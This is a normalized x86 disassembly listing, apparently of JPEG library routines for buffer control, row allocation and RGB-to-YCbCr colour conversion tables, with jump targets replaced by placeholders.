cmp ecx [ ebp + 0x8 ]
jb r-xdata
mov ecx [ ebx + 0xe1 ]
mov edx [ ebp + 0x14 ]
sub ecx [ esi + 0x34 ]
sub edx eax
mov eax edx
mov [ ebp - 0xc ] ecx
cmp eax [ ebp - 0xc ]
jbe r-xdata
mov edx eax
mov edx [ ebp - 0xc ]
jmp r-xdata
mov edx [ esi + 0x34 ]
cmp edx [ ebx + 0xe1 ]
jne r-xdata
mov eax [ esi + 0x34 ]
cmp eax [ ebx + 0xe1 ]
jge r-xdata
mov [ ebp - 0xc ] edx
mov eax [ esi + 0x34 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
lea ecx [ esi + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov eax ebx
shl edx 0x2
add edx [ ebp - 0x4 ]
mov edi [ eax + 0x155 ]
call [ edi + 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
add [ edx ] eax
mov ecx [ ebp - 0xc ]
add [ esi + 0x34 ] ecx
sub [ esi + 0x30 ] eax
cmp [ esi + 0x30 ] 0x0
jne r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
xor ecx ecx
mov eax [ ebp + 0xc ]
mov edx [ eax ]
mov eax ebx
push edx
lea edx [ esi + 0x8 ]
mov edi [ eax + 0x159 ]
call [ edi + 0x4 ]
xor eax eax
mov [ esi + 0x34 ] eax
mov edx [ ebp + 0xc ]
inc [ edx ]
xor edi edi
lea eax [ esi + 0x8 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
cmp edi [ ebx + 0x34 ]
jl r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ ebx + 0x3c ]
mov edx eax
xor edi edi
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebx + 0xe1 ]
push edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx ]
mov ecx [ esi + 0x34 ]
mov edx [ ebx + 0x18 ]
call sub_466914
inc edi
add [ ebp - 0x10 ] 0x4
mov eax [ ebx + 0xe1 ]
mov [ esi + 0x34 ] eax
cmp edi [ ebx + 0x34 ]
jl r-xdata
mov eax [ esi + 0xc ]
mov edx eax
imul edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp + 0xc ]
mov ecx [ ecx ]
imul ecx eax
mov edx [ esi + 0x1c ]
shl edx 0x3
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_466914
add [ ebp - 0x14 ] 0x4
inc edi
add esi 0x54
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ edx ] ecx
jmp r-xdata
sub_466aac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x149 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xe1 ]
lea edx [ edx + edx * 2 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jb r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ecx ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x3c ]
mov edx [ ebp + 0x14 ]
sub ecx [ ebx + 0x34 ]
sub edx eax
mov eax edx
mov [ ebp - 0x10 ] ecx
cmp eax [ ebp - 0x10 ]
jbe r-xdata
mov ecx [ ebx + 0x34 ]
cmp ecx [ ebx + 0x3c ]
jge r-xdata
mov edx eax
mov edx [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebx + 0x34 ]
cmp eax [ ebx + 0x3c ]
jne r-xdata
xor eax eax
lea esi [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add [ ecx ] eax
mov edx [ ebp - 0x10 ]
add [ ebx + 0x34 ] edx
sub [ ebx + 0x30 ] eax
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x14 ] ecx
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x10 ] edx
mov eax [ ebx + 0x34 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ ebp - 0x4 ]
shl edx 0x2
add edx [ ebp - 0x8 ]
mov esi [ eax + 0x155 ]
call [ esi + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1c ]
cmp edx [ ebx + 0x30 ]
jne r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push eax
lea edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x38 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x159 ]
call [ esi + 0x4 ]
mov eax [ ebp + 0xc ]
inc [ eax ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xe1 ]
add [ ebx + 0x38 ] ecx
mov eax [ ebx + 0x38 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
cmp edx [ ebp - 0x14 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
cmp edx [ ebp - 0x14 ]
jg r-xdata
mov ecx [ ebx + 0x34 ]
cmp ecx [ ebp - 0x18 ]
jl r-xdata
xor edx edx
mov [ ebx + 0x38 ] edx
mov eax [ ebx + 0x3c ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x18 ]
mov eax [ esi ]
mov ecx [ ebx + 0x34 ]
call sub_466914
inc [ ebp - 0x14 ]
add esi 0x4
mov ecx [ ebx + 0x3c ]
mov [ ebx + 0x34 ] ecx
mov edi 0x1
mov eax [ ebp - 0x1c ]
mov esi eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xe1 ]
add ecx [ ebx + 0x34 ]
mov [ ebx + 0x3c ] ecx
xor eax eax
mov [ ebx + 0x34 ] eax
mov ecx [ ebp - 0x4 ]
cmp edi [ ecx + 0xe1 ]
jle r-xdata
mov edx edi
neg edx
push edx
push 0x1
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x18 ]
push edx
xor edx edx
mov eax [ esi ]
mov ecx eax
call sub_464490
inc edi
inc [ ebp - 0x14 ]
add [ ebp - 0x1c ] 0x4
sub_466c54
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] eax
mov eax [ esp ]
mov esi [ eax + 0x149 ]
mov eax [ esp ]
mov ebx [ eax + 0xe1 ]
mov eax [ esp ]
mov edx [ eax + 0x34 ]
mov eax [ esp ]
imul edx ebx
mov edi [ eax + 0x4 ]
lea ecx [ edx + edx * 4 ]
shl ecx 0x2
mov edx 0x1
call [ edi ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x4 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x3c ]
mov [ esp + 0x8 ] ecx
lea eax [ esi + 0x8 ]
mov [ esp + 0x10 ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x34 ]
cmp edx [ esp + 0x4 ]
jg r-xdata
lea edx [ ebx + ebx * 2 ]
push edx
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x4 ]
mov eax [ ecx + 0x1c ]
mov ecx [ esp + 0xc ]
shl eax 0x3
imul [ edx + 0xdd ]
cdq
idiv [ ecx + 0x8 ]
mov ecx eax
mov eax [ esp + 0x4 ]
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi + 0x8 ]
mov esi eax
lea eax [ ebx + ebx * 2 ]
shl eax 0x2
mov edx ebx
push eax
push esi
shl edx 0x2
add edx [ esp + 0x14 ]
push edx
call sub_46a330
add esp 0xc
xor eax eax
cmp ebx eax
mov ecx esi
mov edx [ esp + 0xc ]
jle r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov ecx ebx
shl ecx 0x2
mov edx [ esp + 0x10 ]
shl eax 0x2
add eax [ esp + 0xc ]
lea ecx [ ecx + ecx * 4 ]
mov [ edx ] eax
add [ esp + 0xc ] ecx
add [ esp + 0x10 ] 0x4
inc [ esp + 0x4 ]
add [ esp + 0x8 ] 0x54
lea edi [ eax + ebx * 2 ]
mov edi [ esi + edi * 4 ]
mov [ edx ] edi
lea edi [ eax + ebx * 4 ]
mov ebp [ esp + 0xc ]
inc eax
add edx 0x4
lea edi [ ebp + edi * 4 ]
push edi
pop ebp
mov edi [ ecx ]
add ecx 0x4
cmp ebx eax
mov [ ebp ] edi
jg r-xdata
sub_466d6c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
test edx edx
je r-xdata
mov eax ebx
mov ecx 0x40
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x149 ] eax
mov [ eax ] sub_4668d8
mov edx [ ebx + 0x159 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x4
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov [ eax + 0x4 ] sub_46694c
xor ecx ecx
lea edi [ eax + 0x8 ]
mov [ esp ] ecx
mov esi [ ebx + 0x3c ]
jmp r-xdata
mov [ eax + 0x4 ] sub_466aac
mov eax ebx
call sub_466c54
jmp r-xdata
mov eax [ esp ]
cmp eax [ ebx + 0x34 ]
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0xe1 ]
push eax
mov eax [ esi + 0x1c ]
shl eax 0x3
imul [ ebx + 0xdd ]
cdq
idiv [ esi + 0x8 ]
mov ecx eax
mov eax ebx
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x8 ]
mov [ edi ] eax
add edi 0x4
inc [ esp ]
add esi 0x54
sub_466e14
cmp [ eax + 0xe9 ] 0x1
mov edx [ eax + 0x14d ]
jle r-xdata
mov ecx [ eax + 0xe5 ]
dec ecx
cmp ecx [ edx + 0x8 ]
jbe r-xdata
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov ecx [ eax + 0xed ]
mov eax [ ecx + 0x48 ]
mov [ edx + 0x14 ] eax
mov eax [ eax + 0xed ]
mov eax [ eax + 0xc ]
mov [ edx + 0x14 ] eax
jmp r-xdata
xor ecx ecx
xor eax eax
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] eax
retn
sub_466e60
push ebx
push esi
mov esi eax
push edi
xor eax eax
mov edi edx
mov ebx [ esi + 0x14d ]
mov [ ebx + 0x8 ] eax
mov eax esi
call sub_466e14
sub edi 0x1
jb r-xdata
cmp [ ebx + 0x40 ] 0x0
je r-xdata
dec edi
je r-xdata
mov [ ebx + 0x4 ] sub_466ef4
jmp r-xdata
mov edx [ esi ]
mov eax esi
mov [ edx + 0x14 ] 0x4
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
dec edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x4 ] sub_4673b4
jmp r-xdata
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x4
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
jmp r-xdata
mov [ ebx + 0x4 ] sub_467124
jmp r-xdata
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x4
mov edx [ eax ]
call [ edx ]
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x4
mov edx [ eax ]
call [ edx ]
sub_466ef4
push ebx
push esi
push edi
add esp 0xffffffc4
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov esi [ eax + 0x14d ]
mov eax [ esp ]
mov edx [ eax + 0xfd ]
dec edx
mov [ esp + 0xc ] edx
mov ecx [ esp ]
mov eax [ ecx + 0xe5 ]
dec eax
mov [ esp + 0x10 ] eax
mov edx [ esi + 0x10 ]
mov [ esp + 0x20 ] edx
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ esp + 0x20 ]
jg r-xdata
mov ecx [ esi + 0xc ]
mov [ esp + 0x8 ] ecx
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0xc ]
ja r-xdata
inc [ esi + 0x8 ]
mov eax [ esp ]
call sub_466e14
mov eax 0x1
xor ecx ecx
mov [ esi + 0xc ] ecx
inc [ esp + 0x20 ]
xor edx edx
xor ecx ecx
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] ecx
mov eax [ esp + 0x4 ]
mov edx eax
mov [ esp + 0x38 ] edx
mov ecx [ esp ]
lea eax [ ecx + 0xed ]
mov [ esp + 0x30 ] eax
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0xe9 ]
cmp eax [ esp + 0x18 ]
jg r-xdata
mov edx [ esp + 0x30 ]
mov ebx [ edx ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0xc ]
jae r-xdata
lea edx [ esi + 0x18 ]
mov eax [ esp ]
mov ecx [ eax + 0x161 ]
call [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov edx [ ebx + 0x44 ]
mov edx [ ebx + 0x34 ]
jmp r-xdata
inc [ esp + 0x8 ]
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0xc ]
jbe r-xdata
mov edx [ esp + 0x20 ]
mov [ esi + 0x10 ] edx
mov eax [ esp + 0x8 ]
mov [ esi + 0xc ] eax
xor eax eax
jmp r-xdata
mov edx [ esp + 0x1c ]
cmp edx [ ebx + 0x38 ]
jl r-xdata
mov [ esp + 0x24 ] edx
mov eax [ esp + 0x8 ]
imul [ ebx + 0x40 ]
mov [ esp + 0x2c ] eax
mov ecx [ esp + 0x20 ]
shl ecx 0x3
xor eax eax
mov [ esp + 0x28 ] ecx
mov [ esp + 0x1c ] eax
mov edx [ esp + 0x38 ]
mov ecx edx
mov [ esp + 0x34 ] ecx
jmp r-xdata
add esp 0x3c
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
cmp eax [ esp + 0x10 ]
jb r-xdata
inc [ esp + 0x18 ]
add [ esp + 0x38 ] 0x4
add [ esp + 0x30 ] 0x4
mov ecx [ esp + 0x14 ]
mov eax [ esi + ecx * 4 + 0x18 ]
push eax
mov edx [ esp + 0x2c ]
push edx
mov ecx [ esp + 0x34 ]
push ecx
mov eax [ esp + 0x30 ]
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x44 ]
mov edi [ eax + 0x15d ]
mov ecx [ edx ]
mov edx ebx
call [ edi + 0x4 ]
mov eax [ ebx + 0x34 ]
cmp eax [ esp + 0x24 ]
jle r-xdata
mov edx [ esp + 0x20 ]
add edx [ esp + 0x1c ]
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov eax [ ebx + 0x34 ]
add [ esp + 0x14 ] eax
add [ esp + 0x28 ] 0x8
inc [ esp + 0x1c ]
sub eax [ esp + 0x24 ]
shl eax 0x7
push eax
push 0x0
mov edx [ esp + 0x1c ]
add edx [ esp + 0x2c ]
mov ecx [ esi + edx * 4 + 0x18 ]
push ecx
call sub_46a318
add esp 0xc
mov eax [ esp + 0x24 ]
jmp r-xdata
mov eax [ ebx + 0x34 ]
shl eax 0x7
push eax
push 0x0
mov eax [ esp + 0x1c ]
mov edx [ esi + eax * 4 + 0x18 ]
push edx
call sub_46a318
add esp 0xc
xor eax eax
mov edx [ esp + 0x14 ]
lea edx [ esi + edx * 4 + 0x14 ]
jmp r-xdata
cmp eax [ ebx + 0x34 ]
jl r-xdata
cmp eax [ ebx + 0x34 ]
jl r-xdata
mov edx [ esp + 0x14 ]
add edx eax
inc eax
mov ecx [ esi + edx * 4 + 0x14 ]
mov edx [ esi + edx * 4 + 0x18 ]
mov cx [ ecx ]
mov [ edx ] cx
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov edi [ edx ]
add ecx eax
inc eax
mov di [ edi ]
mov ecx [ esi + ecx * 4 + 0x18 ]
mov [ ecx ] di
sub_467124
push ebx
push esi
push edi
add esp 0xffffffb8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x14d ]
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0xe5 ]
dec eax
xor edx edx
mov [ esp + 0xc ] eax
mov [ esp + 0x1c ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x3c ]
mov [ esp + 0x28 ] eax
mov edx [ esp + 0x4 ]
mov ecx edx
mov [ esp + 0x40 ] ecx
mov eax [ esp + 0x8 ]
lea edx [ eax + 0x40 ]
mov [ esp + 0x34 ] edx
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x34 ]
cmp eax [ esp + 0x1c ]
jg r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ ecx + 0xc ]
push eax
push 0x1
mov edx [ esp + 0x10 ]
mov ecx [ edx + 0x8 ]
imul ecx eax
mov eax [ esp + 0x3c ]
mov edx [ eax ]
mov eax [ esp + 0x8 ]
mov ebx [ eax + 0x4 ]
call [ ebx + 0x20 ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x8 ]
cmp edx [ esp + 0xc ]
jae r-xdata
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_4673b4
add esp 0x48
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x28 ]
mov eax [ edx + 0x20 ]
mov edx [ esp + 0x28 ]
mov ecx [ edx + 0xc ]
xor edx edx
div ecx
mov [ esp + 0x24 ] edx
cmp [ esp + 0x24 ] 0x0
jne r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ ecx + 0xc ]
mov [ esp + 0x24 ] eax
jmp r-xdata
mov eax [ esp + 0x28 ]
xor edx edx
mov ecx [ eax + 0x1c ]
mov [ esp + 0x10 ] ecx
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov eax [ esp + 0x10 ]
div ebx
mov esi edx
test esi esi
jle r-xdata
mov [ esp + 0x24 ] ecx
xor edx edx
mov [ esp + 0x20 ] edx
mov ecx [ esp + 0x40 ]
mov eax ecx
mov [ esp + 0x3c ] eax
mov edx [ esp + 0x2c ]
mov ecx edx
mov [ esp + 0x38 ] ecx
mov eax [ esp + 0x20 ]
cmp eax [ esp + 0x24 ]
jge r-xdata
mov eax ebx
sub eax esi
mov esi eax
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x8 ]
cmp eax [ esp + 0xc ]
jne r-xdata
mov edx [ esp + 0x38 ]
mov ecx [ edx ]
mov [ esp + 0x30 ] ecx
mov eax [ esp + 0x30 ]
push eax
mov edx [ esp + 0x24 ]
shl edx 0x3
push edx
push 0x0
mov ecx [ esp + 0x1c ]
push ecx
mov eax [ esp + 0x4c ]
mov edx [ esp + 0x38 ]
mov ecx [ eax ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x15d ]
call [ edi + 0x4 ]
test esi esi
jle r-xdata
add [ esp + 0x34 ] 0x4
add [ esp + 0x40 ] 0x4
inc [ esp + 0x1c ]
add [ esp + 0x28 ] 0x54
add [ esp + 0x10 ] esi
mov eax [ esp + 0x10 ]
xor edx edx
div ebx
mov [ esp + 0x14 ] eax
mov ecx [ esp + 0x24 ]
mov [ esp + 0x20 ] ecx
mov eax [ esp + 0x2c ]
mov edx [ esp + 0x20 ]
lea ecx [ eax + edx * 4 ]
mov [ esp + 0x44 ] ecx
jmp r-xdata
inc [ esp + 0x20 ]
add [ esp + 0x38 ] 0x4
mov eax [ esp + 0x20 ]
cmp eax [ esp + 0x24 ]
jl r-xdata
mov eax [ esp + 0x10 ]
shl eax 0x7
add [ esp + 0x30 ] eax
mov edx esi
shl edx 0x7
push edx
push 0x0
mov ecx [ esp + 0x38 ]
push ecx
call sub_46a318
add esp 0xc
mov eax [ esp + 0x30 ]
mov edx [ esp + 0x30 ]
mov cx [ eax - 0x80 ]
xor eax eax
cmp esi eax
jle r-xdata
mov eax [ esp + 0x28 ]
mov edx [ eax + 0xc ]
cmp edx [ esp + 0x20 ]
jg r-xdata
mov [ edx ] cx
inc eax
add edx 0x80
cmp esi eax
jg r-xdata
mov eax [ esp + 0x44 ]
mov edx [ eax ]
mov [ esp + 0x30 ] edx
mov ecx [ esp + 0x44 ]
mov eax [ esp + 0x10 ]
shl eax 0x7
mov esi [ ecx - 0x4 ]
push eax
push 0x0
mov edx [ esp + 0x38 ]
push edx
call sub_46a318
add esp 0xc
xor ecx ecx
mov [ esp + 0x18 ] ecx
mov eax [ esp + 0x18 ]
cmp eax [ esp + 0x14 ]
jae r-xdata
inc [ esp + 0x20 ]
add [ esp + 0x44 ] 0x4
mov edx ebx
xor eax eax
shl edx 0x7
cmp ebx eax
mov cx [ esi + edx - 0x80 ]
mov edx [ esp + 0x30 ]
jle r-xdata
mov eax ebx
shl eax 0x7
add [ esp + 0x30 ] eax
add esi eax
inc [ esp + 0x18 ]
mov ecx [ esp + 0x18 ]
cmp ecx [ esp + 0x14 ]
jb r-xdata
mov [ edx ] cx
inc eax
add edx 0x80
cmp ebx eax
jg r-xdata
sub_4673b4
push ebx
push esi
push edi
add esp 0xffffffc8
xor ecx ecx
mov [ esp ] eax
mov eax [ esp ]
lea esi [ esp + 0x28 ]
mov edx [ eax + 0x14d ]
mov [ esp + 0x4 ] edx
mov [ esp + 0xc ] ecx
mov eax [ esp ]
lea ebx [ eax + 0xed ]
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0xe9 ]
cmp edx [ esp + 0xc ]
jg r-xdata
mov eax [ ebx ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x18 ]
mov edi [ edx + 0xc ]
push edi
push 0x0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x20 ]
mov ecx [ eax + 0x8 ]
mov eax [ edx + 0x4 ]
imul ecx edi
mov edx [ esp + 0xc ]
mov edx [ edx + eax * 4 + 0x40 ]
mov eax [ esp + 0x8 ]
mov edi [ eax + 0x4 ]
call [ edi + 0x20 ]
mov [ esi ] eax
add esi 0x4
inc [ esp + 0xc ]
add ebx 0x4
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x10 ]
mov [ esp + 0x10 ] eax
jmp r-xdata
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x14 ]
cmp eax [ esp + 0x10 ]
jg r-xdata
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0xc ]
mov [ esp + 0x8 ] ecx
jmp r-xdata
mov edx [ esp + 0x4 ]
inc [ edx + 0x8 ]
mov eax [ esp ]
call sub_466e14
mov eax 0x1
mov edx [ esp ]
mov ecx [ edx + 0xfd ]
cmp ecx [ esp + 0x8 ]
ja r-xdata
xor ebx ebx
xor eax eax
mov [ esp + 0xc ] eax
lea edx [ esp + 0x28 ]
mov [ esp + 0x24 ] edx
mov ecx [ esp ]
lea eax [ ecx + 0xed ]
mov [ esp + 0x1c ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax + 0xc ] edx
inc [ esp + 0x10 ]
mov edx [ esp ]
mov ecx [ edx + 0xe9 ]
cmp ecx [ esp + 0xc ]
jg r-xdata
mov edx [ esp + 0x1c ]
mov ecx [ edx ]
mov [ esp + 0x18 ] ecx
mov eax [ esp + 0x18 ]
mov edx [ eax + 0x34 ]
imul edx [ esp + 0x8 ]
mov [ esp + 0x14 ] edx
xor esi esi
mov eax [ esp + 0x24 ]
mov edx eax
mov [ esp + 0x20 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add edx 0x18
mov ecx [ eax + 0x161 ]
call [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
cmp esi [ eax + 0x38 ]
jl r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x10 ]
mov [ eax + 0x10 ] edx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
mov [ ecx + 0xc ] eax
xor eax eax
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x10 ]
add ecx esi
mov edx [ eax ]
mov eax [ esp + 0x14 ]
shl eax 0x7
mov edx [ edx + ecx * 4 ]
add edx eax
mov eax [ esp + 0x4 ]
xor ecx ecx
lea eax [ eax + ebx * 4 + 0x18 ]
jmp r-xdata
inc [ esp + 0xc ]
add [ esp + 0x24 ] 0x4
add [ esp + 0x1c ] 0x4
add esp 0x38
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x18 ]
cmp ecx [ edi + 0x34 ]
jl r-xdata
mov [ eax ] edx
add edx 0x80
inc ebx
add eax 0x4
inc ecx
inc esi
sub_46757c
push ebx
push esi
mov esi eax
push edi
mov eax esi
push ebp
mov ebx edx
mov edx 0x1
mov edi [ eax + 0x4 ]
add esp 0xfffffff8
mov ecx 0x68
call [ edi ]
mov [ esp ] eax
test ebx ebx
mov eax [ esp ]
mov [ esi + 0x14d ] eax
mov edx [ esp ]
mov [ edx ] sub_466e60
je r-xdata
mov eax esi
mov ecx 0x500
mov edx 0x1
mov ebx [ eax + 0x4 ]
call [ ebx + 0x4 ]
mov ecx eax
xor eax eax
mov edx [ esp ]
add edx 0x18
xor ecx ecx
mov [ esp + 0x4 ] ecx
mov ebx [ esi + 0x3c ]
mov eax [ esp ]
lea edi [ eax + 0x40 ]
jmp r-xdata
mov ebx eax
inc eax
shl ebx 0x7
add ebx ecx
mov [ edx ] ebx
add edx 0x4
cmp eax 0xa
jl r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax + 0x40 ] edx
mov eax [ esi + 0x34 ]
cmp eax [ esp + 0x4 ]
jg r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x1c ]
call sub_464478
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x20 ]
call sub_464478
push eax
mov eax esi
mov ecx [ ebx + 0xc ]
mov edx 0x1
push ecx
xor ecx ecx
mov ebp [ eax + 0x4 ]
call [ ebp + 0x14 ]
mov [ edi ] eax
add edi 0x4
inc [ esp + 0x4 ]
add ebx 0x54
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_467644
push ebx
mov ebx eax
mov eax ebx
push esi
push ecx
mov ecx 0x2000
mov esi [ ebx + 0x155 ]
mov ebx [ eax + 0x4 ]
mov edx 0x1
call [ ebx ]
mov [ esp ] eax
mov [ esi + 0x8 ] eax
xor edx edx
mov ecx [ esp ]
mov eax ecx
imul ecx edx 0x4c8b
mov [ eax ] ecx
imul ecx edx 0x9646
mov [ eax + 0x400 ] ecx
imul ecx edx 0x1d2f
add ecx 0x8000
mov [ eax + 0x800 ] ecx
imul ecx edx 0xffffd4cd
mov [ eax + 0xc00 ] ecx
imul ecx edx 0xffffab33
mov [ eax + 0x1000 ] ecx
mov ecx edx
shl ecx 0xf
add ecx 0x807fff
mov [ eax + 0x1400 ] ecx
imul ecx edx 0xffff94d1
mov [ eax + 0x1800 ] ecx
imul ecx edx 0xffffeb2f
mov [ eax + 0x1c00 ] ecx
inc edx
add eax 0x4
cmp edx 0xff
jle r-xdata
pop edx
pop esi
pop ebx
retn
sub_4676e4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x155 ]
mov esi [ edx + 0x8 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
add [ ebp - 0x4 ] 0x4
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov edx [ ebp + 0xc ]
mov edx [ ecx + edx * 4 ]
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov ebx [ ebp + 0xc ]
mov ecx [ ecx + ebx * 4 ]
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x8 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebx + edi * 4 ]
inc [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x14 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor edx edx
xor ecx ecx
mov dl [ eax + 0x2 ]
xor ebx ebx
mov cl [ eax + 0x1 ]
mov bl [ eax ]
mov [ ebp - 0xc ] ebx
add eax 0x3
mov ebx [ esi + edx * 4 ]
mov edi [ ebp - 0xc ]
add ebx [ esi + ecx * 4 + 0x400 ]
add ebx [ esi + edi * 4 + 0x800 ]
mov edi [ ebp - 0x18 ]
sar ebx 0x10
mov [ edi ] bl
mov ebx [ esi + edx * 4 + 0xc00 ]
mov edi [ ebp - 0xc ]
add ebx [ esi + ecx * 4 + 0x1000 ]
add ebx [ esi + edi * 4 + 0x1400 ]
mov edi [ ebp - 0x1c ]
sar ebx 0x10
mov [ edi ] bl
mov edx [ esi + edx * 4 + 0x1400 ]
add edx [ esi + ecx * 4 + 0x1800 ]
